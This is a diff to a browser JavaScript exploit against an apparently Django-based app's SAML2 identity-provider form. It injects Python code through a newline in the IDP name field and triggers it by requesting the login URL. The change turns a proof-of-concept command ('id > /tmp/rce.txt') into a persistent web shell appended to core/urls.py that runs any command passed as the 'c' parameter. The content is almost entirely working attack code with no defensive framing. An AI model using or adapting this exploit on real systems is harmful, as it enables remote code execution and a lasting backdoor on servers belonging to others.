@@ -1,10 +1,13 @@
  (function() {
      function getCookie(n){let b=document.cookie.match('(^|;)\\s*'+n+'\\s*=\\s*([^;]+)');return b?b.pop():''}
      const id = Math.floor(Math.random() * 9999);
-     const slug = 'rce-' + id;
+     const slug = 'web-' + id;
 
      // The payload: using \n explicitly to break the comment line in the .py file
-     const name = `Exploit${id}\nimport os;os.system("id > /tmp/rce.txt")`;
+     // const name = `E${id}\nimport os;os.system("echo 'from django.urls import re_path as A;from django.http import HttpResponse as B;import os;urlpatterns.insert(0,A(\'^c/?$\',lambda r:B(os.popen(r.GET.get(\'c\')).read())))' >> ./core/urls.py")`;
+     const py = "f=open('core/urls.py','a');f.write('\\nfrom django.urls import re_path as A;from django.http import HttpResponse as B;import os;urlpatterns.insert(0,A(\\'^c/?$\\',lambda r:B(os.popen(r.GET.get(\\'c\\')).read())))');f.close()";
+     const name = `E${id}\n${py}`;
+
 
      const formData = new FormData();
      formData.append('csrfmiddlewaretoken', getCookie('csrftoken'));
@@ -26,9 +29,9 @@
          if (r.ok || r.status === 200) {
              console.log("IDP Created Successfully. Slug: " + slug);
              const triggerUrl = '/saml2/login/' + slug + '/'; // Note the trailing slash
-             console.log("Triggering RCE via: " + triggerUrl);
+             console.log("Triggering Webshell via: " + triggerUrl);
 
-             // Trigger the RCE
+             // Trigger the wenshell
              return fetch(triggerUrl);
          } else {
              throw new Error("POST failed with status: " + r.status);
@@ -38,8 +41,9 @@
          if (r.status === 404) {
              console.error("FAILED: Trigger URL returned 404. The IDP might be inactive or protocol is not SAML.");
          } else {
-             console.log("RCE Triggered! Response code: " + r.status);
-             console.log("Check the container now: ls -l /tmp/rce.txt");
+             console.log("Webshell creation Triggered! Response code: " + r.status);
+             console.log("check /c/?c=id");
+             // setTimeout(() => { window.open('/c/?c=id', '_blank'); }, 5000);
          }
      })
      .catch(e => console.error(e));
